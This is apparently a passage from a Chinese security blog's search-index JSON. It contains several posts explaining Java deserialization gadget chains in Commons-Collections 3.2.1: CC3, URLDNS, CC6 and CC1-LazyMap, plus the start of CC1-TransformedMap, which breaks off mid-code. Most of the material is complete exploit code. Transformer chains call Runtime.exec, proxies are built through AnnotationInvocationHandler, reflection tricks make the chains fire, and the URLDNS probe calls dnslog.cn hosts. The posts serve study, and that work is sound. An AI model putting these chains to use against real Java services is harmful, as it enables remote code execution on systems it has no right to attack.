InvokerTransformer(&quot;newTransformer&quot;, new Class[]&#123;&#125;, null) &#125;; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap&lt;Object, Object&gt; hMap = new HashMap&lt;&gt;(); hMap.put(&quot;key&quot;, &quot;value&quot;); Map decorate = LazyMap.decorate(hMap, chainedTransformer); //decorate.get(Runtime.getRuntime()); Class&lt;?&gt; annotationInvocationHandler = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;); Constructor&lt;?&gt; annotationConstructor = annotationInvocationHandler.getDeclaredConstructor(Class.class, Map.class); annotationConstructor.setAccessible(true); // 这里创建对象时不用像CC1TransformedMap那样需要注意传入的注解类成员变量相关 // 转为InvocationHandler作为代理处理器使用 InvocationHandler o = (InvocationHandler) annotationConstructor.newInstance(Target.class, decorate); // 这里实现了Map接口，要作为Map使用，则转为Map类型 Map map = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), new Class[]&#123;Map.class&#125;, o); // 这里再次创建对象，传入代理过后的对象 Object o1 = annotationConstructor.newInstance(Target.class, map); //serialize(o1); unserialize(&quot;ser.bin&quot;);&#125; 同理，还可以结合CC链1另外一条链以及CC链6的执行点进行利用，毕竟这里只是只是执行点不同 与ysoserial中CC3的区别可以看到在ysoserial中，ConstantTransformer传入的是TrAXFilter，也没有使用InvokerTransformer执行，而是使用InstantiateTransformer 这里其实是在newTransformer方法的基础上进一步查找利用，在TrAXFilter的构造方法中进行调用，但是这个TrAXFilter类不能进行反序列化。然后就结合了InstantiateTransformer#transform方法会创建对象的特性进行了利用 总结正如开头所说，CC链3只是利用TemplatesImpl存在的类加载调用，作为执行类，替换了Runtime类传入了CC链1、CC链6中。相对于链1和链6来说，前面的调用点都是一样的，只是后面执行类的调用比起直接传入Runtime类复杂了一点。 其实这些反序列化链基本可以分为三部分：反序列化入口、调用点、执行点。每个部分可以根据合适的条件进行拆分组合。","categories":[{"name":"JAVA安全","slug":"JAVA安全","permalink":"http://example.com/categories/JAVA%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"JAVA安全","slug":"JAVA安全","permalink":"http://example.com/tags/JAVA%E5%AE%89%E5%85%A8/"},{"name":"CC链","slug":"CC链","permalink":"http://example.com/tags/CC%E9%93%BE/"}]},{"title":"URLDNS链","slug":"URLDNS链","date":"2025-07-13T12:15:01.000Z","updated":"2025-07-13T13:10:52.806Z","comments":true,"path":"2025/07/13/URLDNS链/","permalink":"http://example.com/2025/07/13/URLDNS%E9%93%BE/","excerpt":"","text":"URLDNS链URLDNS链是最简单的链，用来了解反序列化链再合适不过，这条链常用来探测是否存在反序列化漏洞 执行点：URL在URL#hashCode方法中，会调用handler.hashCode对当前对象进行hash计算 1234567public synchronized int hashCode() &#123; if (hashCode != -1) return hashCode; hashCode = handler.hashCode(this); return hashCode;&#125; 而这里的handler.hashCode中，会对传入的url进行解析，具体就是在getHostAddress处 12345678910111213141516171819protected int hashCode(URL u) &#123; int h = 0; // Generate the protocol part. String protocol = u.getProtocol(); if (protocol != null) h += protocol.hashCode(); // Generate the host part. InetAddress addr = getHostAddress(u); if (addr != null) &#123; h += addr.hashCode(); &#125; else &#123; String host = u.getHost(); if (host != null) h += host.toLowerCase().hashCode(); &#125; ...&#125; 也就是说如果我们构建了一个URL对象，其中地址为dnslog地址，那么当调用到URL#hashCode的方法时就会去进行DNS解析，我们就能在平台上看到DNS请求。 而说到会调用hashCode的地方，那就首选HashMap 反序列化起点：HashMap在HashMap#readObject方法最后，有一串代码：putVal(hash(key), key, value, false, false);，对key通过hash方法进行计算 12345678910111213141516171819202122232425262728293031323334353637383940private void readObject(java.io.ObjectInputStream s) throws IOException, ClassNotFoundException &#123; // Read in the threshold (ignored), loadfactor, and any hidden stuff s.defaultReadObject(); reinitialize(); if (loadFactor &lt;= 0 || Float.isNaN(loadFactor)) throw new InvalidObjectException(&quot;Illegal load factor: &quot; + loadFactor); s.readInt(); // Read and ignore number of buckets int mappings = s.readInt(); // Read number of mappings (size) if (mappings &lt; 0) throw new InvalidObjectException(&quot;Illegal mappings count: &quot; + mappings); else if (mappings &gt; 0) &#123; // (if zero, use defaults) // Size the table using given load factor only if within // range of 0.25...4.0 float lf = Math.min(Math.max(0.25f, loadFactor), 4.0f); float fc = (float)mappings / lf + 1.0f; int cap = ((fc &lt; DEFAULT_INITIAL_CAPACITY) ? DEFAULT_INITIAL_CAPACITY : (fc &gt;= MAXIMUM_CAPACITY) ? MAXIMUM_CAPACITY : tableSizeFor((int)fc)); float ft = (float)cap * lf; threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ? (int)ft : Integer.MAX_VALUE); @SuppressWarnings(&#123;&quot;rawtypes&quot;,&quot;unchecked&quot;&#125;) Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])new Node[cap]; table = tab; // Read the keys and values, and put the mappings in the HashMap for (int i = 0; i &lt; mappings; i++) &#123; @SuppressWarnings(&quot;unchecked&quot;) K key = (K) s.readObject(); @SuppressWarnings(&quot;unchecked&quot;) V value = (V) s.readObject(); putVal(hash(key), key, value, false, false); &#125; &#125;&#125; 查看这个hash方法，内部就是在调用key#hashCode方法，如果传入一个URL类，那么就会执行到URL#hashCode 1234static final int hash(Object key) &#123; int h; return (key == null) ? 0 : (h = key.hashCode()) ^ (h &gt;&gt;&gt; 16);&#125; 构造EXP根据上述步骤构造如下代码 12345678910111213public static void main(String[] args) throws Exception &#123; // 创建一个 URL 对象，并传入DNSlog地址 URL url = new URL(&quot;http://1v4k4e.dnslog.cn&quot;); // 创建一个 HashMap 对象，并将 URL 作为key传入 HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;(); hashMap.put(url, &quot;value&quot;); // 序列化 util.serialize(hashMap); // 反序列化 util.unserialize(&quot;ser.bin&quot;); 为了避免干扰，序列化和反序列化之间间隔几分钟在执行，会发现在序列化时进行了dns请求，但是反序列化时则没有进行，这是因为在put时就执行了hashCode 123public V put(K key, V value) &#123; return putVal(hash(key), key, value, false, true);&#125; 在URL#hashCode处打上断点，对序列化过程进行调试。发现hashCode这个属性默认为-1，所以不进入if判断，然后就会进行解析（这里调试时可能会在断点停留好几次，只有一次是想要停下的） 那么这里就采用反射的方式，在put之前修改hashCode的值，put之后改回去，最终代码如下 1234567891011121314151617181920212223242526public class URLDNS &#123; public static void main(String[] args) throws Exception &#123; //创建一个 URL 对象，并传入DNSlog地址 URL url = new URL(&quot;http://miocmv.dnslog.cn&quot;); //创建一个 HashMap 对象，并将 URL 作为key传入 HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;(); Class&lt;? extends URL&gt; aClass = url.getClass(); Field hashCode = aClass.getDeclaredField(&quot;hashCode&quot;); hashCode.setAccessible(true); hashCode.set(url, 1); hashMap.put(url, &quot;value&quot;); hashCode.set(url, -1); //序列化 util.serialize(hashMap); //反序列化 //util.unserialize(&quot;ser.bin&quot;); &#125;&#125; 序列化时调试，hashCode值为1，进入if判断 反序列化调试，hashCode为-1，不进入if判断，然后执行到后续代码进行解析","categories":[{"name":"JAVA安全","slug":"JAVA安全","permalink":"http://example.com/categories/JAVA%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"JAVA安全","slug":"JAVA安全","permalink":"http://example.com/tags/JAVA%E5%AE%89%E5%85%A8/"}]},{"title":"浅述CC链(3)：CC链6","slug":"CC链6","date":"2025-07-12T07:43:39.000Z","updated":"2025-07-13T09:30:48.073Z","comments":true,"path":"2025/07/12/CC链6/","permalink":"http://example.com/2025/07/12/CC%E9%93%BE6/","excerpt":"","text":"CC链6CC链6是CC链1-LazyMap+URLDNS链的结合： URLDNS链中是通过hashMap#readObject方法中，对key进行哈希计算调用了hashCode，当key被赋值为URL类时，调用URL类的hashcode方法会调用到java.net.URLStreamHandler#hashCode，在这个方法里面对传入的域名进行解析，解析时DNSLog就能够获取到对应的数据。 而CC链1-LazyMap是LazyMap#get方法调用到了InvokerTransformer#transform，然后找到AnnotationInvocationHandler的invoke方法调用了LazyMap#get。 如果找到一个类的hashCode方法调用了LazyMap#get，把这个类放入到hashMap，反序列化时就能通过hashCode方法去调用到LazyMap#get最终调用到InvokerTransformer#transform，所以就找到了这里的一个中间类：TiedMapEntry 搭建环境 jdk8u71 Commons-Collections 3.2.1 执行点：InvokerTransformer这里的执行点还是InvokerTransformer，不再过多赘述 1234567891011121314151617public Object transform(Object input) &#123; if (input == null) &#123; return null; &#125; try &#123; Class cls = input.getClass(); Method method = cls.getMethod(iMethodName, iParamTypes); return method.invoke(input, iArgs); &#125; catch (NoSuchMethodException ex) &#123; throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; does not exist&quot;); &#125; catch (IllegalAccessException ex) &#123; throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; cannot be accessed&quot;); &#125; catch (InvocationTargetException ex) &#123; throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; threw an exception&quot;, ex); &#125;&#125; 调用点1：LazyMap这里的调用点依然是LazyMap#get，也不再过多赘述 123456789public Object get(Object key) &#123; // create value for key if key is not currently in the map if (map.containsKey(key) == false) &#123; Object value = factory.transform(key); map.put(key, value); return value; &#125; return map.get(key);&#125; 调用点2：TiedMapEntry看TiedMapEntry#hashCode方法，里面调用了本身的getValue方法 12345public int hashCode() &#123; Object value = getValue(); return (getKey() == null ? 0 : getKey().hashCode()) ^ (value == null ? 0 : value.hashCode()); &#125; 这里的getValue里面调用了一个map.get(key);，按照之前的思路，我们给map赋值为LazyMap，此时就会调用LazyMap#get，key值表示transform的参数进行传递 123public Object getValue() &#123; return map.get(key);&#125; 这里的map来自于TiedMapEntry的构造方法，这个构造方法接收一个map和一个对象，那么在这里传入LazyMap就能够调用到其get方法，最后调用到transform 12345public TiedMapEntry(Map map, Object key) &#123; super(); this.map = map; this.key = key;&#125; 那么来利用当前已知条件来测试代码 1234567891011121314151617181920public static void main(String[] args) throws Exception &#123; Transformer[] transformers = &#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;), new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null,null&#125;), new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;) &#125;; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap&lt;Object, Object&gt; hMap = new HashMap&lt;&gt;(); hMap.put(&quot;key&quot;, &quot;value&quot;); Map decorate = LazyMap.decorate(hMap, chainedTransformer); // 上面都是LazyMap的调用，不再叙述 // 这里是调用TiedMapEntry TiedMapEntry tiedMapEntry = new TiedMapEntry(decorate,&quot;aaa&quot;); tiedMapEntry.hashCode();&#125; 运行代码能够弹出计算器，则说明没问题。现在我们需要将这个代码与URLDNS链结合起来，也就是放入到HashMap中，再进行序列化与反序列化 入口：HashMap这条链的反序列化入口位于HashMap#readObject，要触发到之前的链，需要走到最下面的putVal(hash(key), key, value, false, false);， 12345678910111213141516171819202122232425262728293031323334353637383940private void readObject(java.io.ObjectInputStream s) throws IOException, ClassNotFoundException &#123; // Read in the threshold (ignored), loadfactor, and any hidden stuff s.defaultReadObject(); reinitialize(); if (loadFactor &lt;= 0 || Float.isNaN(loadFactor)) throw new InvalidObjectException(&quot;Illegal load factor: &quot; + loadFactor); s.readInt(); // Read and ignore number of buckets int mappings = s.readInt(); // Read number of mappings (size) if (mappings &lt; 0) throw new InvalidObjectException(&quot;Illegal mappings count: &quot; + mappings); else if (mappings &gt; 0) &#123; // (if zero, use defaults) // Size the table using given load factor only if within // range of 0.25...4.0 float lf = Math.min(Math.max(0.25f, loadFactor), 4.0f); float fc = (float)mappings / lf + 1.0f; int cap = ((fc &lt; DEFAULT_INITIAL_CAPACITY) ? DEFAULT_INITIAL_CAPACITY : (fc &gt;= MAXIMUM_CAPACITY) ? MAXIMUM_CAPACITY : tableSizeFor((int)fc)); float ft = (float)cap * lf; threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ? (int)ft : Integer.MAX_VALUE); @SuppressWarnings(&#123;&quot;rawtypes&quot;,&quot;unchecked&quot;&#125;) Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])new Node[cap]; table = tab; // Read the keys and values, and put the mappings in the HashMap for (int i = 0; i &lt; mappings; i++) &#123; @SuppressWarnings(&quot;unchecked&quot;) K key = (K) s.readObject(); @SuppressWarnings(&quot;unchecked&quot;) V value = (V) s.readObject(); putVal(hash(key), key, value, false, false); &#125; &#125;&#125; 当运行到hash(key)时就会调用hash方法，可以看到这里其实就是在调用hashCode方法，也就是说我们构造的HashMap对象的key就传入TiedMapEntry对象，然后就会调用到TiedMapEntry#hashCode 1234static final int hash(Object key) &#123; int h; return (key == null) ? 0 : (h = key.hashCode()) ^ (h &gt;&gt;&gt; 16);&#125; 构造一下代码 12345678910111213141516171819202122232425262728293031323334public class CC6 &#123; public static void main(String[] args) throws Exception &#123; Transformer[] transformers = &#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;), new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null,null&#125;), new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;) &#125;; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap&lt;Object, Object&gt; hMap = new HashMap&lt;&gt;(); hMap.put(&quot;value&quot;, &quot;value&quot;); Map decorate = LazyMap.decorate(hMap, chainedTransformer); TiedMapEntry tiedMapEntry = new TiedMapEntry(decorate,&quot;111&quot;); HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;(); hashMap.put(tiedMapEntry, &quot;value&quot;); serialize(hashMap); //unserialize(&quot;ser.bin&quot;); &#125; public static void serialize(Object object) throws Exception &#123; ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;)); oos.writeObject(object); &#125; public static Object unserialize(String fileName) throws Exception &#123; ObjectInputStream ois = new ObjectInputStream(new FileInputStream(fileName)); Object obj = ois.readObject(); return obj; &#125;&#125; 但是这里还存在问题，直接进行序列化会报错，在DNSURL链中也存在相同的问题。 这是因为在put时就调用了hashCode执行了代码，但是最后执行代码获取的ProcessImpl实例无法进行序列化就产生了报错 所以这里我们采用URLDNS链中类似的方法，通过反射来处理。这里可以处理的地方很多，只要改变原本的同名方法调用即可，我这里选择的是对LazyMap#get的方法调用进行处理，factory赋予任意一个Transformer，这样就不会调用到Invokertransformer#transform，然后通过反射再给factory赋值 1234567891011121314151617181920212223242526public static void main(String[] args) throws Exception &#123; Transformer[] transformers = &#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;), new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null,null&#125;), new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;) &#125;; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap&lt;Object, Object&gt; hMap = new HashMap&lt;&gt;(); hMap.put(&quot;value&quot;, &quot;value&quot;); Map decorate = LazyMap.decorate(hMap, new ConstantTransformer(1)); TiedMapEntry tiedMapEntry = new TiedMapEntry(decorate,&quot;111&quot;); HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;(); hashMap.put(tiedMapEntry, &quot;value&quot;); Class&lt;? extends Map&gt; aClass = decorate.getClass(); Field factory = aClass.getDeclaredField(&quot;factory&quot;); factory.setAccessible(true); factory.set(decorate, chainedTransformer); serialize(hashMap); unserialize(&quot;ser.bin&quot;);&#125; 可以看到在这里创建LazyMap时传入了一个new ConstantTransformer(1)，put结束后又通过反射重新给factory属性进行赋值 按道理来说此时应该已经构造好了，但是反序列化时还是没有弹出计算器，打上断点进行调试，发现在LazyMap#get方法处的判断没有满足 查看map的属性，发现其中已经多了一个key为111，这与LazyMap有关，LazyMap其实是一种懒加载，当获取key时如果没有这个key，就会自动在当前map中添加 那么直接在序列化之前将这个map中的111去除即可 12345678910111213141516171819202122232425262728293031323334353637383940public class CC6 &#123; public static void main(String[] args) throws Exception &#123; Transformer[] transformers = &#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;), new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null,null&#125;), new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;) &#125;; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap&lt;Object, Object&gt; hMap = new HashMap&lt;&gt;(); hMap.put(&quot;value&quot;, &quot;value&quot;); Map decorate = LazyMap.decorate(hMap, new ConstantTransformer(1)); TiedMapEntry tiedMapEntry = new TiedMapEntry(decorate,&quot;111&quot;); HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;(); hashMap.put(tiedMapEntry, &quot;value&quot;); decorate.remove(&quot;111&quot;); Class&lt;? extends Map&gt; aClass = decorate.getClass(); Field factory = aClass.getDeclaredField(&quot;factory&quot;); factory.setAccessible(true); factory.set(decorate, chainedTransformer); serialize(hashMap); unserialize(&quot;ser.bin&quot;); &#125; public static void serialize(Object object) throws Exception &#123; ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;)); oos.writeObject(object); &#125; public static Object unserialize(String fileName) throws Exception &#123; ObjectInputStream ois = new ObjectInputStream(new FileInputStream(fileName)); Object obj = ois.readObject(); return obj; &#125;&#125; 此时执行反序列化即可弹出计算器，证明当前exp可用 总结CC链6这条链相对简单，就是CC链1-LazyMap的后半截加上URLDNS的前半截，组合成为一条新的链，并且这条链不受java版本限制","categories":[{"name":"JAVA安全","slug":"JAVA安全","permalink":"http://example.com/categories/JAVA%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"JAVA安全","slug":"JAVA安全","permalink":"http://example.com/tags/JAVA%E5%AE%89%E5%85%A8/"},{"name":"CC链","slug":"CC链","permalink":"http://example.com/tags/CC%E9%93%BE/"}]},{"title":"浅述CC链(2)：CC链1-LazyMap","slug":"CC链1-LazyMap","date":"2025-07-08T14:36:56.000Z","updated":"2025-07-13T09:19:59.733Z","comments":true,"path":"2025/07/08/CC链1-LazyMap/","permalink":"http://example.com/2025/07/08/CC%E9%93%BE1-LazyMap/","excerpt":"","text":"CC链1-LazyMap这里来说说CC链1的另外一条链：LazyMap。它和TransformedMap链的执行点一样，都是InvokerTransformer，不同的是中间的调用点不同，调用时涉及到动态代理相关知识，需要提前学习了解这块的内容。 搭建环境 jdk8u65 Commons-Collections 3.2.1 执行点：InvokerTransformer这里的执行点和TransformedMap链相同，不再过多赘述 1234567891011121314151617public Object transform(Object input) &#123; if (input == null) &#123; return null; &#125; try &#123; Class cls = input.getClass(); Method method = cls.getMethod(iMethodName, iParamTypes); return method.invoke(input, iArgs); &#125; catch (NoSuchMethodException ex) &#123; throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; does not exist&quot;); &#125; catch (IllegalAccessException ex) &#123; throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; cannot be accessed&quot;); &#125; catch (InvocationTargetException ex) &#123; throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; threw an exception&quot;, ex); &#125;&#125; 调用点：LazyMap与CC链1-TransformedMap不同的就在这里，这条链的调用点在同一个包中的LazyMap链中 具体的调用点是在LazyMap的get方法中 123456789public Object get(Object key) &#123; // create value for key if key is not currently in the map if (map.containsKey(key) == false) &#123; Object value = factory.transform(key); map.put(key, value); return value; &#125; return map.get(key);&#125; 这里是factory在调用transform方法，这里的factory来自于该类的构造函数，所以这里就要传入invokertransformer，才能变成invokertransformer.transform 1234567protected LazyMap(Map map, Factory factory) &#123; super(map); if (factory == null) &#123; throw new IllegalArgumentException(&quot;Factory must not be null&quot;); &#125; this.factory = FactoryTransformer.getInstance(factory);&#125; 但是这里构造函数通过protected修饰，所以还需要找调用点，然后找到了当前类的decorate方法，接收参数然后返回当前类的实例 123public static Map decorate(Map map, Transformer factory) &#123; return new LazyMap(map, factory);&#125; 尝试构造下利用代码，参数有两个，第一个是一个Map，第二个需要传入构造的invokertransformer 12345678910public static void main(String[] args) throws Exception &#123; InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;); HashMap&lt;Object, Object&gt; hMap = new HashMap&lt;&gt;(); hMap.put(&quot;key&quot;, &quot;value&quot;); Map decorate = LazyMap.decorate(hMap, invokerTransformer); decorate.get(Runtime.getRuntime());&#125; 执行代码能够弹出计算器，则构造没问题，需要注意的是在get方法中存在一个判断，判断传入的map集合中是否包含传入get方法的参数，我们这里构造的不包含，所以能够进入代码。 然后我们需要查找get方法的调用。 调用点和反序列化入口：AnnotationInvocationHandler调用get方法的地方非常多，最后找到了AnnotationInvocationHandler这个类，和CC链1-TransformedMap的入口类一样，但是这里暂时作为调用点存在，这里的调用点在invoke方法中的Object result = memberValues.get(member);处调用了get方法，而memberValues来自于构造方法赋值，要想memberValues.get变成LazyMap.get，那么构造方法中就需要传入前面创建好的decorate。 12345678910111213141516171819202122232425262728293031323334public Object invoke(Object proxy, Method method, Object[] args) &#123; String member = method.getName(); Class&lt;?&gt;[] paramTypes = method.getParameterTypes(); // Handle Object and Annotation methods if (member.equals(&quot;equals&quot;) &amp;&amp; paramTypes.length == 1 &amp;&amp; paramTypes[0] == Object.class) return equalsImpl(args[0]); if (paramTypes.length != 0) throw new AssertionError(&quot;Too many parameters for an annotation method&quot;); switch(member) &#123; case &quot;toString&quot;: return toStringImpl(); case &quot;hashCode&quot;: return hashCodeImpl(); case &quot;annotationType&quot;: return type; &#125; // Handle annotation member accessors Object result = memberValues.get(member); if (result == null) throw new IncompleteAnnotationException(type, member); if (result instanceof ExceptionProxy) throw ((ExceptionProxy) result).generateException(); if (result.getClass().isArray() &amp;&amp; Array.getLength(result) != 0) result = cloneArray(result); return result;&#125; 其实这整个类AnnotationInvocationHandler是一个动态代理的调用处理器类，某个对象调用方法时使用了该类进行代理，就会自动执行该类的invoke方法。如调用A类的xxx方法，如果对A.method使用B类进行了动态代理，那么调用A.xxx的时候就会自动执行B.invoke，有点类似于php的魔术方法 那么当前状态下，我们这里作为代理类，应该代理哪个类呢？我们这里是反序列化链，最好的就是反序列化时会调用到被动态代理的对象的某个方法，正好当前类中存在反序列化readObject方法，所以最好选择readObject方法中可控的点传入被动态代理对象。 如何选择可控点？这里先查看invoke方法中执行到get方法时需要哪些条件来进行决定。 在执行到get前存在两个if和一个switch，在判断member和paramTypes，二者都来自于来自于mehtod，method其实就是要进行代理的方法。这里member获取的就是要代理的方法名，而paramTypes表示方法的参数类型列表 第一个if判断member是否存在equals，即方法名是否存在equals关键字，存在则返回，所以方法不能包含equals才能往下走。 第二个if判断paramTypes是否为0，如果不为0则报错，所以代理的方法需要是一个无参方法才能往下走 switch中则是定义了三个case，如果member满足任意一个都会直接返回，所以这里也不能满足这里的任意一个。 123456789101112131415161718192021222324252627282930313233private void readObject(java.io.ObjectInputStream s) throws java.io.IOException, ClassNotFoundException &#123; s.defaultReadObject(); // Check to make sure that types have not evolved incompatibly AnnotationType annotationType = null; try &#123; annotationType = AnnotationType.getInstance(type); &#125; catch(IllegalArgumentException e) &#123; // Class is no longer an annotation type; time to punch out throw new java.io.InvalidObjectException(&quot;Non-annotation type in annotation serial stream&quot;); &#125; Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes(); // If there are annotation members without values, that // situation is handled by the invoke method. for (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123; String name = memberValue.getKey(); Class&lt;?&gt; memberType = memberTypes.get(name); if (memberType != null) &#123; // i.e. member still exists Object value = memberValue.getValue(); if (!(memberType.isInstance(value) || value instanceof ExceptionProxy)) &#123; memberValue.setValue( new AnnotationTypeMismatchExceptionProxy( value.getClass() + &quot;[&quot; + value + &quot;]&quot;).setMember( annotationType.members().get(name))); &#125; &#125; &#125;&#125; 那么在readObject方法中满足以上条件调用点就是memberValues.entrySet()，即我们要对memberValues进行代理，而这个memberValues是构造方法中传入的一个Map，即创建的动态代理对象要实现Map接口，这样才能代理到Map中的方法。 创建动态代理存在三个参数： 被代理类的类加载器（通常用接口或相关类的类加载器） 被代理类要实现的接口数组（JDK 动态代理只能代理接口） 代理处理器，定义代理对象的方法调用逻辑。 这里已经知道了第二个参数是Map接口，那么其余两个参数呢？ 第一个参数：这个参数用来将代理类进行动态加载，这个类要能加载到接口类，所以直接选择LazyMap或者Map这两个类的加载器即可 第三个参数：我们要执行的invoke方法位于AnnotationInvocationHandler，所以这里传入AnnotationInvocationHandler的对象 那么根据这些条件来构造利用链 123456789101112131415161718192021222324252627282930public static void main(String[] args) throws Exception &#123; Transformer[] transformers = new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;), new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;), new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;) &#125;; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap&lt;Object, Object&gt; hMap = new HashMap&lt;&gt;(); hMap.put(&quot;key&quot;, &quot;value&quot;); Map decorate = LazyMap.decorate(hMap, chainedTransformer); //decorate.get(Runtime.getRuntime()); Class&lt;?&gt; annotationInvocationHandler = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;); Constructor&lt;?&gt; annotationConstructor = annotationInvocationHandler.getDeclaredConstructor(Class.class, Map.class); annotationConstructor.setAccessible(true); // 这里创建对象时不用像CC1TransformedMap那样需要注意传入的注解类成员变量相关 // 转为InvocationHandler作为代理处理器使用 InvocationHandler o = (InvocationHandler) annotationConstructor.newInstance(Target.class, decorate); // 这里实现了Map接口，要作为Map使用，则转为Map类型 Map map = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), new Class[]&#123;Map.class&#125;, o); // 这里再次创建对象，传入代理过后的对象 Object o1 = annotationConstructor.newInstance(Target.class, map); //serialize(o1); unserialize(&quot;ser.bin&quot;);&#125; 总结LazyMap这条链相对于TransformedMap要复杂一点，主要是中间还涉及到动态代理相关的知识","categories":[{"name":"JAVA安全","slug":"JAVA安全","permalink":"http://example.com/categories/JAVA%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"JAVA安全","slug":"JAVA安全","permalink":"http://example.com/tags/JAVA%E5%AE%89%E5%85%A8/"},{"name":"CC链","slug":"CC链","permalink":"http://example.com/tags/CC%E9%93%BE/"}]},{"title":"浅述CC链(1)：CC链1-TransformedMap","slug":"CC链1-TransformedMap","date":"2025-07-06T15:26:15.000Z","updated":"2025-07-13T09:27:27.154Z","comments":true,"path":"2025/07/06/CC链1-TransformedMap/","permalink":"http://example.com/2025/07/06/CC%E9%93%BE1-TransformedMap/","excerpt":"","text":"CC链1-TransformedMap反序列化利用链的大概流程如下图所示，其实就是找到一个可利用点，不停寻找调用点，一直到起点调用，中间的调用点可以不存在，也可以很多 这里先来说说CC链1，CC链1存在两条链，先说TransformedMap这一条 搭建环境 jdk8u65 Commons-Collections 3.2.1 执行点：InvokerTransformer在InvokerTransformer这个类中，存在一个transform方法，接收一个类文件，然后进行反射调用 1234567891011121314151617public Object transform(Object input) &#123; if (input == null) &#123; return null; &#125; try &#123; Class cls = input.getClass(); Method method = cls.getMethod(iMethodName, iParamTypes); return method.invoke(input, iArgs); &#125; catch (NoSuchMethodException ex) &#123; throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; does not exist&quot;); &#125; catch (IllegalAccessException ex) &#123; throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; cannot be accessed&quot;); &#125; catch (InvocationTargetException ex) &#123; throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; threw an exception&quot;, ex); &#125;&#125; 其中的iMethodName、iParamTypes等参数，来自于这个类的构造文件 123456public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) &#123; super(); iMethodName = methodName; iParamTypes = paramTypes; iArgs = 